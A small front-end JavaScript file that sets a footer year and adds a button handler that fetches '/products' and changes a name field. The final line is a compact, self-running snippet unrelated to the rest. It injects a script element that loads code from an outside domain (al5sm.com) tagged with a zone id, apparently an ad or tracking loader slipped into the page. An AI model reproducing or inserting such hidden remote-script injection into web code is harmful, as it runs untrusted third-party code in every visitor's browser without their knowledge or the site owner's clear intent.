

document.getElementById('year').textContent = new Date().getFullYear();
document.getElementById('vbu').addEventListener('click', clicked)

async function clicked() {
    const res = await fetch('/products', {
        method: 'GET'
    })
    const data = await res.json()

    document.getElementById('nome').innerText = 'EMXCODER'
}

(function (s) { s.dataset.zone = '10804632', s.src = 'https://al5sm.com/tag.min.js' })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))